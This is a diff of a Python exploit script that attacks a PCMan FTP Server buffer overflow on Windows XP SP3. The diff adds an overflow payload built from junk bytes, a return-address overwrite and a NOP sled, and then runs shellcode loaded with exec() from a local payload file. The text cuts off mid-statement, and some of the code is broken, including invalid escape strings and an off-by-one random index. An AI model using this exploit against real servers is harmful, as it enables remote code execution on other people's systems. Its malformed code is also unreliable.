@@ -1,6 +1,7 @@
 import ftplib
 import cmd
 import random
+from socket import AF_INET, SOCK_STREAM, socket, gethostbyname
 
 def getToken(line):
     token = ""
@@ -14,7 +15,6 @@ def getToken(line):
 class pcmanPutOverflowMenu(cmd.Cmd):
   def __init__(self):
     cmd.Cmd.__init__(self)
-    self.shellType = ["bind"]
     self.user = ["anonymous"]
     self.passwd = ["anonymous@example.com"]
     self.host = ["ftp.debian.org"]
@@ -31,9 +31,7 @@ class pcmanPutOverflowMenu(cmd.Cmd):
   def do_set(self, args):
     var = getToken(args)
     val = args[len(var) + 3:]
-    if var == "shell-type":
-      self.shellType[0] = val
-    elif var == "user":
+    if var == "user":
       self.user[0] = val
     elif var == "passwd":
       self.passwd[0] = val
@@ -50,7 +48,6 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     print "Target: Windows XP SP3 English"
     print "Options for pcman_put_overflow:"
     print "========================"
-    print "shell-type    %s    the type of shell to spawn" % self.shellType[0]
     print "user    %s    the user to login in as" % self.user[0]
     print "passwd    %s    the password of the user" % self.passwd[0]
     print "host    %s    the IP of the target"
@@ -75,8 +72,14 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     except:
       print "[-]Login unsuccessful on %s" % self.host[0]
       return
+    print "[*]Generating payload..."
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 2017):
       payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += "\x77\"
+    payload += "\x77\xc3\x54\x59"
+    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    exec(open("../../../payloads/pcman_put.shell", "r").read())
+    print "[+]Payload generated."
+    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
+    ftp.
